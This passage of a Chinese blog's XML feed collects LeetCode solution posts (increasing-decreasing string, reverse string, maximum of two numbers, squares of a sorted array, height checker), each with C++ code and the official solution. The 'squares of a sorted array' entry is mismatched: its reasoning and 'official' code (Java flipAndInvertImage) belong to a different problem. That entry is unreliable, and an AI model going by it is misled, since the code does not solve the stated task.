class="comment">//找到了则从arr中删除掉这个元素</span></span><br><span class="line">                arr.erase(it);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，其实思路也挺清晰的。看了一些题解后，更明白地讲就是只需判断两个数组排序后是否相等即可，使用sort函数排序，3行代码就搞定。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>上升下降字符串</title>
    <url>/2020/11/17/%E4%B8%8A%E5%8D%87%E4%B8%8B%E9%99%8D%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/increasing-decreasing-string/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个字符串 <code>s</code> ，请你根据下面的算法重新构造字符串：</p>
<ol>
<li>从 <code>s</code> 中选出 <strong>最小</strong> 的字符，将它 <strong>接在</strong> 结果字符串的后面。</li>
<li>从 <code>s</code> 剩余字符中选出 <strong>最小</strong> 的字符，且该字符比上一个添加的字符大，将它 接在 结果字符串后面。</li>
<li>重复步骤 2 ，直到你没法从 <code>s</code> 中选择字符。</li>
<li>从 <code>s</code> 中选出 <strong>最大</strong> 的字符，将它 <strong>接在</strong> 结果字符串的后面。</li>
<li>从 <code>s</code> 剩余字符中选出 <strong>最大</strong> 的字符，且该字符比上一个添加的字符小，将它 接在 结果字符串后面。</li>
<li>重复步骤 5 ，直到你没法从 <code>s</code> 中选择字符。</li>
<li>重复步骤 1 到 6 ，直到 <code>s</code> 中所有字符都已经被选过。</li>
</ol>
<p>在任何一步中，如果最小或者最大字符不止一个 ，你可以选择其中任意一个，并将其添加到结果字符串。</p>
<p>请你返回将 <code>s</code> 中字符重新排序后的 <strong>结果字符串</strong> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;aaaabbbbcccc&quot;</span><br><span class="line">输出：&quot;abccbaabccba&quot;</span><br><span class="line">解释：第一轮的步骤 1，2，3 后，结果字符串为 result &#x3D; &quot;abc&quot;</span><br><span class="line">第一轮的步骤 4，5，6 后，结果字符串为 result &#x3D; &quot;abccba&quot;</span><br><span class="line">第一轮结束，现在 s &#x3D; &quot;aabbcc&quot; ，我们再次回到步骤 1</span><br><span class="line">第二轮的步骤 1，2，3 后，结果字符串为 result &#x3D; &quot;abccbaabc&quot;</span><br><span class="line">第二轮的步骤 4，5，6 后，结果字符串为 result &#x3D; &quot;abccbaabccba&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;rat&quot;</span><br><span class="line">输出：&quot;art&quot;</span><br><span class="line">解释：单词 &quot;rat&quot; 在上述算法重排序以后变成 &quot;art&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;leetcode&quot;</span><br><span class="line">输出：&quot;cdelotee&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;ggggggg&quot;</span><br><span class="line">输出：&quot;ggggggg&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例5：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;spo&quot;</span><br><span class="line">输出：&quot;ops&quot;</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 500</code></li>
<li><code>s</code> 只包含小写英文字母。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>一开始尝试使用暴力模拟，先给字符串字符sort非递减排序。第一轮正向遍历求出一串升序字符串，反向遍历求出一串降序字符串然后循环直到所有字符都已被选过。运行超出时间限制了，意料之中遍历太慢了。</p>
<p>重新思考，注意到提示中s只包含小写英文字母，想到了从没用过的计数法，使用大小为26的数组存储字符串中字符出现的个数，然后正向将出现的字母依次放入结果字符串中，放入字母后，该字母的数量应该减1，然后再反向遍历放入字母，直到数组中元素的值为0即所有字符都已被选过。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败56.24%，内存消耗7.9M，击败26.54%）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    string sortString(string s) &#123;</span><br><span class="line">        &#x2F;&#x2F;计数法</span><br><span class="line">        string result&#x3D;&quot;&quot;;</span><br><span class="line">        &#x2F;&#x2F;因为s只包含小写英文字母,用数组存储每个字母的个数</span><br><span class="line">        vector&lt;int&gt; num(26,0);</span><br><span class="line">        int i;</span><br><span class="line">        for(i&#x3D;0;i&lt;s.length();++i)&#123;</span><br><span class="line">            ++num[s[i]-&#39;a&#39;];</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;数组num中元素最大值大于零就表示还有字符没有选过</span><br><span class="line">        while(*max_element(num.begin(),num.end())&gt;0)&#123;</span><br><span class="line">            &#x2F;&#x2F;从前往后遍历，选出最小字符</span><br><span class="line">            for(i&#x3D;0;i&lt;26;++i)&#123;</span><br><span class="line">                if(num[i]!&#x3D;0)&#123;</span><br><span class="line">                    result+&#x3D;i+&#39;a&#39;;</span><br><span class="line">                    &#x2F;&#x2F;当前字符数量减一</span><br><span class="line">                    --num[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F;从后往前遍历，选出最大字符</span><br><span class="line">            for(i&#x3D;25;i&gt;&#x3D;0;--i)&#123;</span><br><span class="line">                if(num[i]!&#x3D;0)&#123;</span><br><span class="line">                    result+&#x3D;i+&#39;a&#39;;</span><br><span class="line">                    --num[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;      </span><br><span class="line">        &#125;</span><br><span class="line">        return result;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/increasing-decreasing-string/solution/shang-sheng-xia-jiang-zi-fu-chuan-by-leetcode-solu/">官方题解</a>:</h6><p><strong>方法一：桶记数</strong></p>
<p><strong>思路</strong></p>
<p>我们可以开一个长度为 26 的数组表示 26 个桶，每个桶里存放一种字母。先用 $O(|s|)$ 的时间扫描一遍字符串（其中 $|s|$代表字符串的长度），统计每个字母出现的次数。然后我们只要不停地扫描这里的「桶序列」——先从小到大扫，再从大到小扫，每次发现一个桶当中计数值不为 0 的时候，就把这个桶对应的字母添加到结果字符串的最后方，然后对计数值减一。</p>
<p>具体地，开一个长度为 26 的数组 <code>h[]</code>，作为用来计数的「桶」。<code>haveChar</code> 的功能是在每次循环开始执行之前判断是否还有未使用的字符。<code>appendChar</code> 的功能是检测当前位置的桶是否计数值为 0，如果不为 0 则修改目标串和计数值。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗7.8M，击败28.96%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> h[<span class="number">26</span>];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">haveChar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (h[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">sortString</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span> &amp;c: s) ++h[c - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> ret;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">auto</span> appendChar = [&amp;] (<span class="keyword">int</span> p) &#123;</span><br><span class="line">            <span class="keyword">if</span> (h[p]) &#123;</span><br><span class="line">                --h[p];</span><br><span class="line">                ret.push_back(p + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!haveChar()) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i) appendChar(i);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">25</span>; i &gt;= <span class="number">0</span>; --i) appendChar(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：考虑最坏情况下字符串 $s$ 中 $|s|$ 个字符全部是同一个字母，最外层的 <code>while</code> 循环就要执行 $\lceil \frac{|s|}{2} \rceil$ 次（其中 $\lceil x \rceil$表示 $x$向上取整），每次执行中又包含 3 个执行 26 次的循环，故这里的渐进时间复杂度为 $O(3 \times 26 \times |s|) = O(|s|)$。</li>
<li>空间复杂度：这里使用了长度为 26 的数组作为辅助空间，故渐进空间复杂度为 $O(26)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解也是用的计数法，还改了个名字叫桶计数🤣，嗯，简单题不难，只要努力去做都会做出来的。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>反转字符串</title>
    <url>/2020/11/17/%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/height-checker/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>编写一个函数，其作用是将输入的字符串反转过来。输入字符串以字符数组 <code>char[]</code> 的形式给出。</p>
<p>不要给另外的数组分配额外的空间，你必须原地<strong>修改输入数组</strong>、使用 O(1) 的额外空间解决这一问题。</p>
<p>你可以假设数组中的所有字符都是 ASCII 码表中的可打印字符。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;h&quot;,&quot;e&quot;,&quot;l&quot;,&quot;l&quot;,&quot;o&quot;]</span><br><span class="line">输出：[&quot;o&quot;,&quot;l&quot;,&quot;l&quot;,&quot;e&quot;,&quot;h&quot;]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;H&quot;,&quot;a&quot;,&quot;n&quot;,&quot;n&quot;,&quot;a&quot;,&quot;h&quot;]</span><br><span class="line">输出：[&quot;h&quot;,&quot;a&quot;,&quot;n&quot;,&quot;n&quot;,&quot;a&quot;,&quot;H&quot;]</span><br></pre></td></tr></table></figure>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历字符串（只需遍历前一半），使用swap函数交换前后两个字符。</p>
<p><strong>c++代码：</strong>(执行用时32ms，击败99.67%，内存消耗23.2M，击败5.18%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reverseString</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&amp; s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=s.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n/<span class="number">2</span>;++i)&#123;</span><br><span class="line">            swap(s[i],s[n-i<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/reverse-string/solution/fan-zhuan-zi-fu-chuan-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一：双指针</strong></p>
<p><strong>思路与算法</strong></p>
<p>对于长度为 <code>N</code> 的待被反转的字符数组，我们可以观察反转前后下标的变化，假设反转前字符数组为 <code>s[0] s[1] s[2] ... s[N - 1]</code>，那么反转后字符数组为 <code>s[N - 1] s[N - 2] ... s[0]</code>。比较反转前后下标变化很容易得出 <code>s[i]</code> 的字符与 <code>s[N - 1 - i]</code> 的字符发生了交换的规律，因此我们可以得出如下双指针的解法：</p>
<ul>
<li><p>将 <code>left</code> 指向字符数组首元素，<code>right</code> 指向字符数组尾元素。</p>
</li>
<li><p>当 <code>left &lt; right</code>：</p>
<ul>
<li><p>交换 <code>s[left]</code> 和 <code>s[right]</code>；</p>
</li>
<li><p><code>left</code> 指针右移一位，即 <code>left = left + 1</code>；</p>
</li>
<li><code>right</code> 指针左移一位，即 <code>right = right - 1</code>。</li>
</ul>
</li>
<li><p>当 <code>left &gt;= right</code>，反转结束，返回字符数组即可。</p>
</li>
</ul>
<p><img src="/2020/11/17/%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2/344_fig1.png" alt="fig1"></p>
<p><strong>c++代码：</strong>(执行用时40ms，击败96.82%，内存消耗23M，击败17.48%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reverseString</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&amp; s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> left = <span class="number">0</span>, right = n - <span class="number">1</span>; left &lt; right; ++left, --right) &#123;</span><br><span class="line">            swap(s[left], s[right]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 $N$ 为字符数组的长度。一共执行了 $N/2$ 次的交换。</li>
<li>空间复杂度：$O(1)$。只使用了常数空间来存放若干变量。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>和官方题解思路一样，代码也是一致的思路，有些许差别。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>最大数值</title>
    <url>/2020/11/17/%E6%9C%80%E5%A4%A7%E6%95%B0%E5%80%BC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/maximum-lcci/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>编写一个方法，找出两个数字<code>a</code>和<code>b</code>中最大的那一个。不得使用if-else或其他比较运算符。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： a &#x3D; 1, b &#x3D; 2</span><br><span class="line">输出： 2</span><br></pre></td></tr></table></figure>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>使用三目运算符，不知道可以吗？</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.2M，击败6.42%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maximum</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a&gt;b?a:b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，题目要求不能使用比较运算符，三目运算符中也包含比较了，应该也是不满足题意的。通过看题解，总结如下：</p>
<p>返回两个数的最大值，两种情况：</p>
<ul>
<li>$a&gt;b$，那么返回$\frac{a+b+a-b}{2}$</li>
<li>$a&lt;b$，那么返回$\frac{b+a+b-a}{2}$</li>
</ul>
<p>两种情况综合一下就是要返回$\frac{a+b+|a-b|}{2}$</p>
<p>nice😊，注意a、b要强制转换成long进行计算，否则会溢出。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>有序数组的平方</title>
    <url>/2020/11/16/%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E5%B9%B3%E6%96%B9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/squares-of-a-sorted-array/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个按非递减顺序排序的整数数组 <code>A</code>，返回每个数字的平方组成的新数组，要求也按非递减顺序排序。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[-4,-1,0,3,10]</span><br><span class="line">输出：[0,1,9,16,100]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[-7,-3,2,3,11]</span><br><span class="line">输出：[4,9,9,49,121]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><code>1 &lt;= A.length &lt;= 10000</code></li>
<li><code>-10000 &lt;= A[i] &lt;= 10000</code></li>
<li><code>A</code> 已按非递减顺序排序。</li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历每一行，然后对每一行中的元素翻转交换元素的值（swap函数），再反转元素的值，注意特殊情况，矩阵行数为奇数时中间元素要特殊处理反转一次。</p>
<p><strong>c++代码：</strong>(执行用时136ms，击败27.35%，内存消耗24.9M，击败41.18%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sortedSquares</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;A.size();++i)&#123;</span><br><span class="line">            A[i]=<span class="built_in">pow</span>(A[i],<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//对新数组非递减排序</span></span><br><span class="line">        sort(A.begin(),A.end());</span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/squares-of-a-sorted-array/solution/you-xu-shu-zu-de-ping-fang-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一： 模拟</strong></p>
<p>我们可以不使用额外的（非常数）空间来完成翻转和反转操作。对于 <code>A[i][j]​</code>，我们将它和 <code>A[i][c - j - 1]​</code> 进行交换（即翻转），其中 <code>c</code> 是数组 <code>A</code> 的列数。在交换的同时，我们可以将这两个数进行反转。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] flipAndInvertImage(<span class="keyword">int</span>[][] A) &#123;</span><br><span class="line">        <span class="keyword">int</span> C = A[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>[] row: A)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (C + <span class="number">1</span>) / <span class="number">2</span>; ++i) &#123;</span><br><span class="line">                <span class="keyword">int</span> tmp = row[i] ^ <span class="number">1</span>;</span><br><span class="line">                row[i] = row[C - <span class="number">1</span> - i] ^ <span class="number">1</span>;</span><br><span class="line">                row[C - <span class="number">1</span> - i] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(M*N)$，其中 $M$ 和 $N$ 分别为数组 <code>A</code> 的行数和列数。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解和我的思路一样，不过对于特殊情况比我处理的好，也不算特殊情况吧，只是我自己把它当作特殊情况处理了，主要在于我使用了vector容器中的swap成员函数来交换两个元素，这样必须反转后覆盖原值，对于奇数行数矩阵的每行中间元素反转了两次，而采用tmp辅助变量来进行交换两个元素值不涉及到覆盖问题。其实就是太执着于STL模板库中的成员函数了，自己实现交换元素的功能也挺好，相当于对源码根据实际情况进行了改进，这样才能更灵活地处理问题。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>高度检查器</title>
    <url>/2020/11/16/%E9%AB%98%E5%BA%A6%E6%A3%80%E6%9F%A5%E5%99%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/height-checker/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>学校在拍年度纪念照时，一般要求学生按照 <strong>非递减</strong> 的高度顺序排列。</p>
<p>请你返回能让所有学生以 <strong>非递减</strong> 高度排列的最小必要移动人数。</p>
<p>注意，当一组学生被选中时，他们之间可以以任何可能的方式重新排序，而未被选中的学生应该保持不动。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：heights &#x3D; [1,1,4,2,1,3]</span><br><span class="line">输出：3 </span><br><span class="line">解释：</span><br><span class="line">当前数组：[1,1,4,2,1,3]</span><br><span class="line">目标数组：[1,1,1,2,3,4]</span><br><span class="line">在下标 2 处（从 0 开始计数）出现 4 vs 1 ，所以我们必须移动这名学生。</span><br><span class="line">在下标 4 处（从 0 开始计数）出现 1 vs 3 ，所以我们必须移动这名学生。</span><br><span class="line">在下标 5 处（从 0 开始计数）出现 3 vs 4 ，所以我们必须移动这名学生。</span><br></pre></td></tr></table></figure>
